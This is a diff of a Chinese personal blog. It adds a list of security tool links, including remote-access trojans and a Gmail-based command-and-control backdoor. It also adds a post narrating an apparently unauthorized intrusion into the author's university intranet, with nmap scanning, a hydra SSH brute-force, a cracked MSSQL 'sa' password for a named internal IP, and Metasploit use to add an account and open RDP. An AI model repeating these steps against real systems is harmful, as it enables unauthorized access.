+<h2 id="gps欺骗检测工具"><a href="#gps欺骗检测工具" class="headerlink" title="gps欺骗检测工具:"></a>gps欺骗检测工具:</h2><p><a target="_blank" rel="noopener" href="https://github.com/zxsecurity/gpsnitch">https://github.com/zxsecurity/gpsnitch</a></p>
+<h2 id="应急处置响应框架"><a href="#应急处置响应框架" class="headerlink" title="应急处置响应框架:"></a>应急处置响应框架:</h2><p><a target="_blank" rel="noopener" href="https://github.com/biggiesmallsAG/nightHawkResponse">https://github.com/biggiesmallsAG/nightHawkResponse</a></p>
+<h2 id="web安全开发指南"><a href="#web安全开发指南" class="headerlink" title="web安全开发指南:"></a>web安全开发指南:</h2><p><a target="_blank" rel="noopener" href="https://github.com/FallibleInc/security-guide-for-developers">https://github.com/FallibleInc/security-guide-for-developers</a></p>
+<h2 id="各个知名厂商漏洞测试报告模板："><a href="#各个知名厂商漏洞测试报告模板：" class="headerlink" title="各个知名厂商漏洞测试报告模板："></a>各个知名厂商漏洞测试报告模板：</h2><p><a target="_blank" rel="noopener" href="https://github.com/juliocesarfort/public-pentesting-reports">https://github.com/juliocesarfort/public-pentesting-reports</a> </p>
+<h2 id="linux下恶意代码检测包："><a href="#linux下恶意代码检测包：" class="headerlink" title="linux下恶意代码检测包："></a>linux下恶意代码检测包：</h2><p><a target="_blank" rel="noopener" href="https://github.com/rfxn/linux-malware-detect">https://github.com/rfxn/linux-malware-detect</a></p>
+<h2 id="操作系统运行指标可视化框架："><a href="#操作系统运行指标可视化框架：" class="headerlink" title="操作系统运行指标可视化框架："></a>操作系统运行指标可视化框架：</h2><p><a target="_blank" rel="noopener" href="https://github.com/facebook/osquery">https://github.com/facebook/osquery</a></p>
+<h2 id="恶意代码分析系统："><a href="#恶意代码分析系统：" class="headerlink" title="恶意代码分析系统："></a>恶意代码分析系统：</h2><p><a target="_blank" rel="noopener" href="https://github.com/cuckoosandbox/cuckoo">https://github.com/cuckoosandbox/cuckoo</a></p>
+<h2 id="定期搜索及存储web应用："><a href="#定期搜索及存储web应用：" class="headerlink" title="定期搜索及存储web应用："></a>定期搜索及存储web应用：</h2><p><a target="_blank" rel="noopener" href="https://github.com/Netflix/Scumblr">https://github.com/Netflix/Scumblr</a></p>
+<h2 id="事件响应框架："><a href="#事件响应框架：" class="headerlink" title="事件响应框架："></a>事件响应框架：</h2><p><a target="_blank" rel="noopener" href="https://github.com/google/grr">https://github.com/google/grr</a></p>
+<h2 id="综合主机监控检测平台："><a href="#综合主机监控检测平台：" class="headerlink" title="综合主机监控检测平台："></a>综合主机监控检测平台：</h2><p><a target="_blank" rel="noopener" href="https://github.com/ossec/ossec-hids">https://github.com/ossec/ossec-hids</a></p>
+<h2 id="分布式实时数字取证系统："><a href="#分布式实时数字取证系统：" class="headerlink" title="分布式实时数字取证系统："></a>分布式实时数字取证系统：</h2><p><a target="_blank" rel="noopener" href="https://github.com/mozilla/mig">https://github.com/mozilla/mig</a></p>
+<h2 id="Microsoft-amp-Unix-文件系统及硬盘取证工具："><a href="#Microsoft-amp-Unix-文件系统及硬盘取证工具：" class="headerlink" title="Microsoft &amp; Unix 文件系统及硬盘取证工具："></a>Microsoft &amp; Unix 文件系统及硬盘取证工具：</h2><p><a target="_blank" rel="noopener" href="https://github.com/sleuthkit/sleuthkit">https://github.com/sleuthkit/sleuthkit</a></p>
+<h1 id="蜜罐："><a href="#蜜罐：" class="headerlink" title="蜜罐："></a>蜜罐：</h1><h2 id="SSH蜜罐："><a href="#SSH蜜罐：" class="headerlink" title="SSH蜜罐："></a>SSH蜜罐：</h2><p><a target="_blank" rel="noopener" href="https://github.com/desaster/kippo">https://github.com/desaster/kippo</a></p>
+<h2 id="蜜罐集合资源："><a href="#蜜罐集合资源：" class="headerlink" title="蜜罐集合资源："></a>蜜罐集合资源：</h2><p><a target="_blank" rel="noopener" href="https://github.com/paralax/awesome-honeypots">https://github.com/paralax/awesome-honeypots</a></p>
+<h2 id="kippo进阶版蜜罐："><a href="#kippo进阶版蜜罐：" class="headerlink" title="kippo进阶版蜜罐："></a>kippo进阶版蜜罐：</h2><p><a target="_blank" rel="noopener" href="https://github.com/micheloosterhof/cowrie">https://github.com/micheloosterhof/cowrie</a></p>
+<h2 id="SMTP-蜜罐："><a href="#SMTP-蜜罐：" class="headerlink" title="SMTP 蜜罐："></a>SMTP 蜜罐：</h2><p><a target="_blank" rel="noopener" href="https://github.com/awhitehatter/mailoney">https://github.com/awhitehatter/mailoney</a></p>
+<h2 id="web应用程序蜜罐："><a href="#web应用程序蜜罐：" class="headerlink" title="web应用程序蜜罐："></a>web应用程序蜜罐：</h2><p><a target="_blank" rel="noopener" href="https://github.com/mushorg/glastopf">https://github.com/mushorg/glastopf</a></p>
+<h2 id="数据库蜜罐："><a href="#数据库蜜罐：" class="headerlink" title="数据库蜜罐："></a>数据库蜜罐：</h2><p><a target="_blank" rel="noopener" href="https://github.com/jordan-wright/elastichoney">https://github.com/jordan-wright/elastichoney</a></p>
+<h2 id="web蜜罐："><a href="#web蜜罐：" class="headerlink" title="web蜜罐："></a>web蜜罐：</h2><p><a target="_blank" rel="noopener" href="https://github.com/atiger77/Dionaea">https://github.com/atiger77/Dionaea</a></p>
+<h1 id="远控："><a href="#远控：" class="headerlink" title="远控："></a>远控：</h1><h2 id="用gmail充当C-amp-C服务器的后门"><a href="#用gmail充当C-amp-C服务器的后门" class="headerlink" title="用gmail充当C&amp;C服务器的后门"></a>用gmail充当C&amp;C服务器的后门</h2><p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a></p>
+<h2 id="开源的远控："><a href="#开源的远控：" class="headerlink" title="开源的远控："></a>开源的远控：</h2><p><a target="_blank" rel="noopener" href="https://github.com/UbbeLoL/uRAT">https://github.com/UbbeLoL/uRAT</a></p>
+<h2 id="c-远控："><a href="#c-远控：" class="headerlink" title="c#远控："></a>c#远控：</h2><p><a target="_blank" rel="noopener" href="https://github.com/hussein-aitlahcen/BlackHole">https://github.com/hussein-aitlahcen/BlackHole</a></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -302,7 +665,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -323,6 +686,7 @@
 </h2>
  
 
+      
     </header>
      
     <div class="article-meta">
@@ -330,7 +694,36 @@
   <time datetime="2017-10-31T17:42:00.000Z" itemprop="datePublished">2017-11-01</time>
 </a>    
     </div>
+      
+    <div class="article-entry" itemprop="articleBody">
        
+  <p>一篇以前写文章，无意间又翻到因此传上来分享</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先在宿舍访问学校内网需要在路由器断开ppoe拨号，并切换成动态IP方式才可以正常访问。根据学校机房所在的位置，断网情况只存在宿舍区域推测内网的服务器是不会受断网影响。所以如果我能拿到内网服务器不仅能够突破11.40的断网说不定还能整个大学生涯免费上网， 想想都有点小激动。</p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>首先用nmap扫描内网B段</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml 192.168.1.1/16</span><br></pre></td></tr></table></figure>
+
+
+<p>![enter description here][1]</p>
+<p>65536个IP地址中有266个存活，排除本机所在的C段证明只有一个段是公共区域可以访问的，也就是学校的内网web服务器，先直接使用nmap扫描C段 </p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo namp -sS -sV -O -Pn 192.168.200.1/24</span><br></pre></td></tr></table></figure>
+<p>![enter description here][2]</p>
+<p>扫描后发现常见的135 139 445端口均被过滤 4899与3306也惨遭沦陷，根据扫描结果与测试后得知以下情况<br>1.已知校园服务器网段为192.168.200.1/24<br>2.常见端口均被过滤，仅幸存21,22,23,80,1433<br>3.且已验证每台开放web服务的服务器上都装有企业版360与网站卫士<br>所以我思路是打算目前放弃开放web服务的服务器（等大神放0day）从21，22和1433上找出口哦不找弱口令，把开放相关端口的IP整理好。</p>
+<h1 id="意大利炮！开火！"><a href="#意大利炮！开火！" class="headerlink" title="意大利炮！开火！"></a>意大利炮！开火！</h1><h2 id="1-FTP匿名登录"><a href="#1-FTP匿名登录" class="headerlink" title="1.FTP匿名登录"></a>1.FTP匿名登录</h2><p>![enter description here][3]<br>无果（好像扫出来了没什么用）</p>
+<h2 id="2-ssh爆破"><a href="#2-ssh爆破" class="headerlink" title="2.ssh爆破"></a>2.ssh爆破</h2><p>![enter description here][4]</p>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -M /home/guoker/22ip.txt -l root -P /home/guoker/Blasting_dictionary/top100password.txt -vV  ssh </span><br></pre></td></tr></table></figure>
+
+<p>![enter description here][5]</p>
+<h2 id="3-mssql爆破"><a href="#3-mssql爆破" class="headerlink" title="3. mssql爆破"></a>3. mssql爆破</h2><p>![enter description here][6]<br>![enter description here][7]<br>192.168.200.148 sa 123456aa 嘿嘿</p>
+<h1 id="文末"><a href="#文末" class="headerlink" title="文末"></a>文末</h1><p>msf</p>
+<p>![enter description here][8]<br>![enter description here][9]</p>
+<p>然后就是cmd加账号开3389，我就不截图了。<br>![enter description here][10]</p>
+<p>关于Windows2003单网卡搭建VPN 有兴趣的小伙伴可以自行百度下。<br>到这儿文章就已经结束了，其他东西也不在本文多叙述</p>
+<p>关于下集的内网渗透我会在联系学校修复后，抽个时间写写。Thanks<br>  [1]: <a target="_blank" rel="noopener" href="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509556899374.jpg">http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509556899374.jpg</a><br>  [2]: <a target="_blank" rel="noopener" href="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557114150.jpg">http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557114150.jpg</a><br>  [3]: <a target="_blank" rel="noopener" href="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557481199.jpg">http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557481199.jpg</a><br>  [4]: <a target="_blank" rel="noopener" href="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557571181.jpg">http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557571181.jpg</a><br>  [5]: <a target="_blank" rel="noopener" href="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557606563.jpg">http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557606563.jpg</a><br>  [6]: <a target="_blank" rel="noopener" href="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557634147.jpg">http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557634147.jpg</a><br>  [7]: <a target="_blank" rel="noopener" href="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557642563.jpg">http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557642563.jpg</a><br>  [8]: <a target="_blank" rel="noopener" href="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557690451.jpg">http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557690451.jpg</a><br>  [9]: <a target="_blank" rel="noopener" href="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557695321.jpg">http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557695321.jpg</a><br>  [10]: <a target="_blank" rel="noopener" href="http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557707606.jpg">http://photo.o0o0.club/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1509557707606.jpg</a></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
     <!-- copyright -->
     
@@ -343,7 +736,7 @@
 
     
  
-   
+    
 </article>
 
     
@@ -364,18 +757,12 @@
     <ul>
       <li>
         Copyrights &copy;
-        2017-2021
+        2017-2022
         <i class="ri-heart-fill heart_icon"></i> GuoKer
       </li>
     </ul>
     <ul>
       <li>
-        
-        
-        
-        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
-        <span class="division">|</span>
-        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
         
       </li>
     </ul>
@@ -387,9 +774,12 @@
     <ul>
       
         <li>
-          <a href="http://beian.miit.gov.cn/" target="_black">桂ICP备19000641号-1</a>
+          <a href="http://beian.miit.gov.cn/" target="_black" rel="nofollow">桂ICP备19000641号-1</a>
         </li>
         
+    </ul>
+    <ul>
+      
     </ul>
     <ul>
       <li>
@@ -400,9 +790,10 @@
       </li>
     </ul>
   </div>
-</footer>
-      <div class="float_btns">
-        <div class="totop" id="totop">
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
   <i class="ri-arrow-up-line"></i>
 </div>
 
@@ -410,8 +801,7 @@
   <i class="ri-moon-line"></i>
 </div>
 
-      </div>
-    </main>
+    </div>
     <aside class="sidebar on">
       <button class="navbar-toggle"></button>
 <nav class="navbar">
@@ -471,12 +861,6 @@
 </div>
 </div>
     </aside>
-    <script>
-      if (window.matchMedia("(max-width: 768px)").matches) {
-        document.querySelector('.content').classList.remove('on');
-        document.querySelector('.sidebar').classList.remove('on');
-      }
-    </script>
     <div id="mask"></div>
 
 <!-- #reward -->
@@ -493,22 +877,23 @@
   </div>
 </div>
     
-<script src="/js/jquery-2.0.3.min.js"></script>
-
-
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
 
 <script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
 <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
 
 <script src="/dist/main.js"></script>
 
 <!-- ImageViewer -->
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
 <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
 
     <!-- Background of PhotoSwipe. 
@@ -613,8 +998,7 @@
         })
     }
     viewer_init()
-</script>
-
+</script> 
 <!-- MathJax -->
 
 <!-- Katex -->
@@ -626,17 +1010,13 @@
 <!-- ClickBoom1 -->
 
 <!-- ClickBoom2 -->
-
-
+ 
 <script src="/js/clickBoom2.js"></script>
-
-
+ 
 <!-- CodeCopy -->
-
-
+ 
 <link rel="stylesheet" href="/css/clipboard.css">
-
-<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 <script>
   function wait(callback, seconds) {
     var timelag = null;
@@ -690,12 +1070,19 @@
     initCopyCode();
   }(window, document);
 </script>
-
-
+ 
 <!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
 
 
     
+    
+
   </div>
 </body>
 
